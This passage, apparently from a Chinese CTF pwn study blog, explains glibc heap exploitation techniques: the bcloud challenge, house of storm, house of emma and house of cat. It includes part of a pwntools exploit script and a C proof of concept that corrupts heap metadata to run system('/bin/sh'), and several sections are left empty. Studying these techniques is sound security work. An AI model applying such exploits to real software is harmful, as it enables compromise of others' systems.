class="comment">#debug()</span></span><br><span class="line">	add(offset, <span class="string">b&quot;d&quot;</span>)</span><br><span class="line">	</span><br><span class="line">	add(<span class="number">0x10</span>, p64(magic) * <span class="number">2</span>)</span><br><span class="line">	<span class="built_in">print</span>(p.recv())</span><br><span class="line">	p.interactive()</span><br><span class="line">	</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	exp()</span><br></pre></td></tr></table></figure>
<h2 id="例题2-bcloud"><a href="#例题2-bcloud" class="headerlink" title="例题2-bcloud"></a>例题2-bcloud</h2><p>checksec</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/aichch/pwn/bcloud&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
<p>程序是一个笔记管理系统。首先，程序会进行一些初始化，设置用户的名字，组织，host。</p>
<p>程序主要有以下几个功能</p>
<ol>
<li>新建 note，根据用户的输入 x 申请 x+4 的空间作为 note 的大小。</li>
<li>展示 note，啥功能也没有。。</li>
<li>编辑 note，根据用户指定的 note 编辑对应的内容。</li>
<li>删除 note，删除对应 note。</li>
<li>同步 note，标记所有的 note 已经被同步。</li>
</ol>
<p>然而在这五个功能中都没有明显可利用的漏洞,实际上漏洞在开始时。</p>
<p>在读取名字时是先读入到栈中然后再利用strcpy函数转移至堆中,都知道strcpy是遇到空字符才会停止,而栈中<strong>存储堆的指针紧邻着name缓冲区</strong>,这就意味着只要填满name缓冲区,就会将堆指针一起写到堆中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">sub_80487A1</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">64</span>]; <span class="comment">// [esp+1Ch] [ebp-5Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> *tmp; <span class="comment">// [esp+5Ch] [ebp-1Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// [esp+6Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x50</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input your name:&quot;</span>);</span><br><span class="line">  myread((<span class="type">int</span>)s, <span class="number">64</span>, <span class="number">10</span>);</span><br><span class="line">  tmp = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x40</span>u);</span><br><span class="line">  dworr_804B0CC_name = (<span class="type">int</span>)tmp;</span><br><span class="line">  <span class="built_in">strcpy</span>(tmp, s);</span><br><span class="line">  info(tmp);</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后info又会将其打印出来,于是泄露了堆地址</p>
<p>之后的读取org和host同样是利用strcpy,不过是这次strcpy可以转移的长度更长可以利用其覆盖topchunk的size</p>
<p>之后</p>
<h1 id="house-of-lore"><a href="#house-of-lore" class="headerlink" title="house of lore"></a>house of lore</h1><h1 id="house-of-orange"><a href="#house-of-orange" class="headerlink" title="house of orange"></a>house of orange</h1><h1 id="house-of-rabbit"><a href="#house-of-rabbit" class="headerlink" title="house of rabbit"></a>house of rabbit</h1><h1 id="house-of-roman"><a href="#house-of-roman" class="headerlink" title="house of roman"></a>house of roman</h1><h1 id="house-of-pig"><a href="#house-of-pig" class="headerlink" title="house of pig"></a>house of pig</h1><h1 id="house-of-spirit"><a href="#house-of-spirit" class="headerlink" title="house of spirit"></a>house of spirit</h1><h1 id="house-of-kiwi"><a href="#house-of-kiwi" class="headerlink" title="house of kiwi"></a>house of kiwi</h1><h1 id="house-of-banana"><a href="#house-of-banana" class="headerlink" title="house of banana"></a>house of banana</h1><h1 id="house-of-storm"><a href="#house-of-storm" class="headerlink" title="house of storm"></a>house of storm</h1><p><strong>漏洞利用条件:</strong></p>
<ol>
<li>glibc版本小于2.30,因为2.30之后加入了检查</li>
<li>需要攻击者在 <code>large_bin</code> 和 <code>unsorted_bin</code> 中分别布置一个chunk 这两个chunk需要在归位之后处于同一个 <code>largebin</code> 的index中,<strong>且 <code>unsorted_bin</code> 中的chunk要比 <code>large_bin</code> 中的大</strong></li>
<li>需要 <code>unsorted_bin</code> 中的 <code>bk指针</code> 可控</li>
<li>需要 <code>large_bin</code> 中的 <code>bk指针和bk_nextsize</code> 指针可控</li>
<li>开启了pie,不开启也能但不如用其他方法</li>
</ol>
<p>相较于largebin attack多了一个unsorted_chunk-&gt;bk条件</p>
<hr>
<p> <code>House_of_storm</code>从根本上也是写堆地址，但是攻击者可以利用巧妙的构造<code>把这个堆地址伪造成size字段</code>。</p>
<p><strong>通过以前的知识可以知道<code>unsorted_bin_attack</code>的攻击是需要在对应地址伪造一个chunk结构出来的，而这个伪造出来的chunk结构最重要的就是这个<code>size字段</code>，因为只有首先有了<code>size字段</code>Glibc才会确认这是个chunk结构 才会有后续的验证。</strong></p>
<p>但是目前的情况因为我们不能去对应的地址伪造chunk，那么首要目标就是利用<code>Largebin_attack</code>在目标地址-8的位置上写出来一个<code>size</code>，其次就是对Glibc检验的绕过。明确了任务 下面就配合实例来具体讲解一下怎么构造</p>
<h3 id="例"><a href="#例" class="headerlink" title="例"></a>例</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc -ggdb -fpie -pie -o house_of_storm house_of_storm.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>  presize;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>  size;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>  fd;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>  bk;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>  fd_nextsize;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>  bk_nextsize;</span><br><span class="line">&#125;chunk;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *large_chunk,*unsorted_chunk;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *fake_chunk = (<span class="type">unsigned</span> <span class="type">long</span> *)&amp;chunk;</span><br><span class="line">    <span class="type">char</span> *ptr;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    unsorted_chunk=<span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0X20</span>);</span><br><span class="line">    large_chunk=<span class="built_in">malloc</span>(<span class="number">0x408</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(large_chunk);</span><br><span class="line">    <span class="built_in">free</span>(unsorted_chunk);</span><br><span class="line">    unsorted_chunk=<span class="built_in">malloc</span>(<span class="number">0x418</span>);  <span class="comment">//large_chunk归位</span></span><br><span class="line">    <span class="built_in">free</span>(unsorted_chunk);  <span class="comment">// unsorted_chunk归位</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//重点以下3步</span></span><br><span class="line">    unsorted_chunk[<span class="number">1</span>] = (<span class="type">unsigned</span> <span class="type">long</span> )fake_chunk;</span><br><span class="line">    large_chunk[<span class="number">1</span>]    = (<span class="type">unsigned</span> <span class="type">long</span> )fake_chunk+<span class="number">8</span>;</span><br><span class="line">    large_chunk[<span class="number">3</span>]    = (<span class="type">unsigned</span> <span class="type">long</span> )fake_chunk<span class="number">-0x18</span><span class="number">-5</span>;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x48</span>);</span><br><span class="line">    <span class="built_in">strncpy</span>(ptr, <span class="string">&quot;/bin/sh\x00&quot;</span>, <span class="number">0x10</span>);</span><br><span class="line">    system(((<span class="type">char</span> *)fake_chunk + <span class="number">0x10</span>));</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在开启pie的情况下,堆块的高位一般都是0x55或0x56,共6字节,从size-5开始写就可以刚好把高位写在size</p>
<p>所以当我们申请的size和<code>0x56</code>经过对齐后相等的话，那么就可以拿到任意的chunk。</p>
<p>0x55 : <code>1010101</code></p>
<p>0x56 : <code>1010110</code></p>
<p><code>__int_malloc</code>在拿到chunk后返回到<code>__libc_malloc</code>，<code>__libc_malloc</code>会对chunk的进行检查，这里如果有错的话会直接crash，但是由于程序有随机化，多运行几次总能有一次成功的。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	#define arena_for_chunk(ptr) \</span></span><br><span class="line"><span class="comment">    	(chunk_non_main_arena (ptr) ? heap_for_ptr (ptr)-&gt;ar_ptr : &amp;main_arena)</span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">    过以下检测需要满足的要求，只需满足一条即可</span></span><br><span class="line"><span class="comment">    1. victim 为 0</span></span><br><span class="line"><span class="comment">    2. IS_MMAPPED 为 1</span></span><br><span class="line"><span class="comment">    3. NON_MAIN_ARENA 为 0</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">assert(!victim || chunk_is_mmapped(mem2chunk(victim)) </span><br><span class="line">       || ar_ptr == arena_for_chunk(mem2chunk(victim)));</span><br></pre></td></tr></table></figure>
<p>可以看出只有高位为0x56的情况下能通过检测</p>
<h1 id="house-of-emma"><a href="#house-of-emma" class="headerlink" title="house of emma"></a>house of emma</h1><p>参考<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-270429.htm">[原创]【伽玛】第七届“湖湘杯” House _OF _Emma | 设计思路与解析-Pwn-看雪-安全社区|安全招聘|kanxue.com</a></p>
<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p> GLIBC2.34 版本中，本应在 CTF 的 PWN 题中常用 Hook — <strong>free_hook 、</strong> <strong>malloc_hook</strong> 被取消，同时有些题目的限制中，我无法构造出任意地址申请。</p>
<p>因此在新版中各种各样的限制下,迫使利用者转变思路：从以往的 <strong>任意地址申请</strong> <strong>→</strong> <strong>构成任意读写</strong> →<strong>从而 Getshell</strong> ，转变为：<strong>在某处写一个可控地址直接 Getshell（借助于 IO_FILE）</strong>。</p>
<p>显而易见的，后者的所需条件一定是少于前者的。</p>
<p>但是在新版本 glibc 下的 IO_FILE 攻击中，通常还是借助这两个 Hook 来辅助进行攻击，但并不适用于 GLIBC 2.34 版本，因此急需发现一个类似于<strong>__free_hook</strong> 这样的函数指针调用，从而来削弱 Getshell 的限制条件。</p>
<h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><ol>
<li>可以任意写一个可控地址（LargeBin Attack、Tcache Stashing Unlink Attack…）</li>
<li>可以触发 IO 流（FSOP、<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/235598">House OF Kiwi</a>）</li>
</ol>
<h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>在 vtable 的合法范围内，存在一个 _IO_cookie_jumps：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_cookie_jumps</span> <span class="title">libio_vtable</span> =</span> &#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_file_finish),</span><br><span class="line">  JUMP_INIT(overflow, _IO_file_overflow),</span><br><span class="line">  JUMP_INIT(underflow, _IO_file_underflow),</span><br><span class="line">  JUMP_INIT(uflow, _IO_default_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, _IO_default_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_file_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_default_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_cookie_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_file_setbuf),</span><br><span class="line">  JUMP_INIT(sync, _IO_file_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_file_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_cookie_read),</span><br><span class="line">  JUMP_INIT(write, _IO_cookie_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_cookie_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_cookie_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_default_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue),</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>在 vtable 的检测中对具体位置的检测还是比较宽松的，这使得可以在一定的范围内对 vtable 表的起始位置进行偏移，使其在调用<strong>具体偏移是固定</strong>的情况下，可以通过偏移来调用在 vtable 表中的任意函数，因此考虑将其指定为以下几个函数。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">ssize_t</span></span><br><span class="line">_IO_cookie_read (FILE *fp, <span class="type">void</span> *buf, <span class="type">ssize_t</span> size)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_file</span> *<span class="title">cfile</span> =</span> (<span class="keyword">struct</span> _IO_cookie_file *) fp;</span><br><span class="line">  <span class="type">cookie_read_function_t</span> *read_cb = cfile-&gt;__io_functions.read;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (read_cb);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (read_cb == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">return</span> read_cb (cfile-&gt;__cookie, buf, size);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span></span><br><span class="line">_IO_cookie_write (FILE *fp, <span class="type">const</span> <span class="type">void</span> *buf, <span class="type">ssize_t</span> size)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_file</span> *<span class="title">cfile</span> =</span> (<span class="keyword">struct</span> _IO_cookie_file *) fp;</span><br><span class="line">  <span class="type">cookie_write_function_t</span> *write_cb = cfile-&gt;__io_functions.write;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (write_cb);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (write_cb == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="type">ssize_t</span> n = write_cb (cfile-&gt;__cookie, buf, size);</span><br><span class="line">  <span class="keyword">if</span> (n &lt; size)</span><br><span class="line">    fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="type">off64_t</span></span><br><span class="line">_IO_cookie_seek (FILE *fp, <span class="type">off64_t</span> offset, <span class="type">int</span> dir)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_file</span> *<span class="title">cfile</span> =</span> (<span class="keyword">struct</span> _IO_cookie_file *) fp;</span><br><span class="line">  <span class="type">cookie_seek_function_t</span> *seek_cb = cfile-&gt;__io_functions.seek;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (seek_cb);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"> </span><br><span class="line">  <span class="keyword">return</span> ((seek_cb == <span class="literal">NULL</span></span><br><span class="line">       || (seek_cb (cfile-&gt;__cookie, &amp;offset, dir)</span><br><span class="line">           == <span class="number">-1</span>)</span><br><span class="line">       || offset == (<span class="type">off64_t</span>) <span class="number">-1</span>)</span><br><span class="line">      ? _IO_pos_BAD : offset);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line">_IO_cookie_close (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_file</span> *<span class="title">cfile</span> =</span> (<span class="keyword">struct</span> _IO_cookie_file *) fp;</span><br><span class="line">  <span class="type">cookie_close_function_t</span> *close_cb = cfile-&gt;__io_functions.close;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (close_cb);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (close_cb == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">return</span> close_cb (cfile-&gt;__cookie);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这几个函数内存在任意函数指针调用，且函数指针来源于_IO_cookie_file 结构体，<strong>这个结构体是 _IO_FILE_plus 的扩展</strong>，如果可以控制 IO 的内容，大概率这部分的数据也是可控的，并且其的第一个参数也是来源于这个结构。所以可以把其当做一个类似于 __free_hook 的 Hook 来利用。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Special file type for fopencookie function.  */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_file</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> __<span class="title">fp</span>;</span></span><br><span class="line">  <span class="type">void</span> *__cookie;</span><br><span class="line">  <span class="type">cookie_io_functions_t</span> __io_functions;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_io_functions_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">cookie_read_function_t</span> *read;        <span class="comment">/* Read bytes.  */</span></span><br><span class="line">  <span class="type">cookie_write_function_t</span> *write;    <span class="comment">/* Write bytes.  */</span></span><br><span class="line">  <span class="type">cookie_seek_function_t</span> *seek;        <span class="comment">/* Seek/tell file position.  */</span></span><br><span class="line">  <span class="type">cookie_close_function_t</span> *close;    <span class="comment">/* Close file.  */</span></span><br><span class="line">&#125; <span class="type">cookie_io_functions_t</span>;</span><br></pre></td></tr></table></figure>
<p><strong>绕过 PTR_DEMANGLE</strong></p>
<p>在上面的分析中，暂时忽略了一个可能会存在的问题，也就是在上面代码中函数指针调用前所执行的 PTR_DEMANGLE （指针保护）选项是默认开启的，这意味着需要解决指针加密的问题。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="type">uintptr_t</span> __pointer_chk_guard attribute_relro;</span><br><span class="line"><span class="meta">#  <span class="keyword">define</span> PTR_MANGLE(var) \</span></span><br><span class="line"><span class="meta">  (var) = (__typeof (var)) ((uintptr_t) (var) ^ __pointer_chk_guard)</span></span><br><span class="line"><span class="meta">#  <span class="keyword">define</span> PTR_DEMANGLE(var) PTR_MANGLE (var)</span></span><br></pre></td></tr></table></figure>
<p>根据 <strong>GLIBC Wiki</strong> 上的解释 <a target="_blank" rel="noopener" href="https://sourceware.org/glibc/wiki/PointerEncryption">Pointer Encryption</a>，可以得知这个是 GLIBC 的一项安全功能，用于增加攻击者在 GLIBC 结构中操纵指针（尤其是函数指针）的难度。这时，通过调试可以得知，这个值存在于 TLS 段上，将其 ROR 移位 0x11 后再与指针进行异或。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/940906_U9ZGVURG434TPE6.png" alt=""></p>
<p>fs[0x30] 的值位于与 libc 相邻的 ld 空间中，这个位置距离 libc 地址的偏移固定，虽然无法泄露<strong>出这个位置随机值的内容，但是可以</strong>利用很多方法对其进行写入**：</p>
<ol>
<li>Fastbin Reverse Into Tcache</li>
<li>Tcache Stashing Unlink Attack</li>
<li>LargeBin Attack</li>
</ol>
<p>但无论使用什么方法，根本思想：还是让这个本来是随机的、不确定的异或值，转变为已知的地址。而通常在满足能够利用 IO_FILE 的情况下，这个前置要求都能够被满足。</p>
<h3 id="实操可能的问题"><a href="#实操可能的问题" class="headerlink" title="实操可能的问题"></a>实操可能的问题</h3><p>在实际操作中，可能因为 stderr 的指针存放在 bss 段上，从而导致无法篡改。只能使用 exit 来触发 FSOP，但是又会发现如果通过 exit 来触发 FSOP，会遇到在 exit 中也有调用指针保护的函数指针执行，但此时的异或内容被我们所篡改，使得无法执行正确的函数地址，且此位置在 FSOP 之前，从而导致程序没有进入 IO 流就发生了错误。</p>
<p>这种时候就可以考虑构造两个 IO_FILE，且后者指针处于前者的 _chains 处，前者用 <a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/216290">GLIBC2.24 之前的 IO_FILE 攻击</a> 的思想在 __pointer_chk_guard 处写已知内容，后者再用 House_OF_Emma 来进行函数指针调用。 </p>
<h1 id="house-of-cat"><a href="#house-of-cat" class="headerlink" title="house of cat"></a>house of cat</h1><p>参考<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-273895.htm">[原创]House of cat新型glibc中IO利用手法解析 &amp;&amp; 第六届强网杯House of cat详解-Pwn-看雪-安全社区|安全招聘|kanxue.com</a></p>
<p><strong>一种新型GLIBC中IO利用思路，目前适用于任何版本（包括glibc2.35）</strong></p>
<p><a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-270429.htm">House of emma</a>是glibc2.34下常用的攻击手法之一，利用条件只需任意写一个可控地址就可以控制程序执行流，攻击威力十分强大。但是需要攻击位于TLS的<strong>_pointer_chk_guard</strong>，并且远程可能需要爆破TLS偏移。</p>
<p>House of Cat利用了House of emma的虚表偏移修改思想，通过修改虚表指针的偏移，避免了对需要绕过TLS上 <strong>_pointer_chk_guard</strong>的检测相关的IO函数的调用，转而调用<strong>_IO_wfile_jumps</strong>中的<strong>_IO_wfile_seekoff</strong>函数，然后进入到<strong>_IO_switch_to_wget_mode</strong>函数中来攻击，从而使得攻击条件和利用变得更为简单。并且house of cat在<strong>FSOP</strong>的情况下也是可行的，只需修改虚表指针的偏移来调用<strong>_IO_wfile_seekoff</strong>即可（通常是结合<strong>__malloc_assert</strong>，改vtable为<strong>_IO_wfile_jumps+0x10</strong>）。</p>
<h3 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h3><ol>
<li>能够任意写一个可控地址。</li>
<li>能够泄露堆地址和libc基址。</li>
<li>能够触发IO流（FSOP或触发__malloc_assert，或者程序中存在puts等能进入IO链的函数），执行IO相关函数。</li>
</ol>
<h3 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h3><h4 id="IO-FILE结构及利用"><a href="#IO-FILE结构及利用" class="headerlink" title="IO_FILE结构及利用"></a>IO_FILE结构及利用</h4><p>在高版本libc中，当攻击条件有限（如不能造成任意地址写）或者libc版本中无hook函数（libc2.34及以后）时，伪造fake_IO进行攻击是一种常见可行的攻击方式，</p>
<p>常见的触发IO函数的方式有FSOP、__malloc_assert（当然也可以用puts等函数，只不过需要任意地址写任意值直接改掉libc中的stdout结构体），</p>
<p><strong>当进入IO流时会根据vtable指针调用相关的IO函数</strong>，如果在题目中造成任意地址写一个可控地址（如large bin attack、tcache stashing unlink attack、fastbin reverse into tcache），然后伪造fake_IO结构体配合恰当的IO调用链，可以达到控制程序执行流的效果。</p>
